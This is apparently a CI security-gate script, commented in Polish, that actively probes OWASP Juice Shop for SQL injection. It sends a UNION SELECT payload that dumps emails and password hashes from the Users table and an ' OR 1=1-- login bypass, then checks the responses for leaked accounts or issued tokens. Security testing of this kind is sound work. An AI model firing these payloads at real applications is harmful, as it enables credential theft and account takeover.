#!/bin/bash
# ---------------------------------------------------------------------------
# Aktywny test wstrzyknięć SQL (active DAST probe) dla OWASP Juice Shop.
#
# W odróżnieniu od skanu pasywnego (ZAP Baseline, który analizuje wyłącznie
# odpowiedzi serwera) ten test AKTYWNIE wstrzykuje ładunki ataku do działającej
# aplikacji i sprawdza, czy podatność jest wykorzystywalna. Wykrywa znaleziska
# klasy High (SQL Injection), niewidoczne dla skanu pasywnego.
#
# Użycie:  dast-sqli-probe.sh <BASE_URL> "<ETYKIETA>"
# Kod wyjścia:  0 = aplikacja odporna (brak SQLi);  1 = wykryto SQLi (High)
# Dzięki temu krok może działać jako bramka bezpieczeństwa (security gate) w CI.
# ---------------------------------------------------------------------------
set -u
BASE="$1"
LABEL="$2"

# Ładunek 1 — wstrzyknięcie UNION w wyszukiwarce produktów (wyciek tabeli Users)
SQLI_SEARCH="qwert')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--"
# Ładunek 2 — obejście uwierzytelnienia w logowaniu (' OR 1=1--)
printf '%s' '{"email":"'"'"' OR 1=1--","password":"x"}' > /tmp/login_inj.json

VULN=0

RESP=$(curl -s -G "$BASE/rest/products/search" --data-urlencode "q=$SQLI_SEARCH")
LEAK=$(echo "$RESP" | grep -oE '[a-zA-Z0-9._%+-]+@juice-sh\.op' | sort -u | wc -l)

LRESP=$(curl -s -w 'HTTPSTATUS:%{http_code}' -X POST "$BASE/rest/user/login" \
        -H 'Content-Type: application/json' -d @/tmp/login_inj.json)
CODE=$(echo "$LRESP" | sed -e 's/.*HTTPSTATUS://')

echo "### $LABEL — $BASE"
if [ "$LEAK" -gt 0 ]; then
  echo "- **[SQLi-1] /rest/products/search** — PODATNE (High): wyciek $LEAK kont z tabeli Users (email + hash hasła)"
  VULN=1
else
  echo "- **[SQLi-1] /rest/products/search** — OK: brak wycieku (zapytanie sparametryzowane \`:q\`)"
fi
if echo "$LRESP" | grep -q '"token"'; then
  echo "- **[SQLi-2] /rest/user/login** — PODATNE (High): obejście logowania, token wydany bez hasła (HTTP $CODE)"
  VULN=1
else
  echo "- **[SQLi-2] /rest/user/login** — OK: logowanie odrzucone (HTTP $CODE, brak tokenu)"
fi
echo ""

exit $VULN
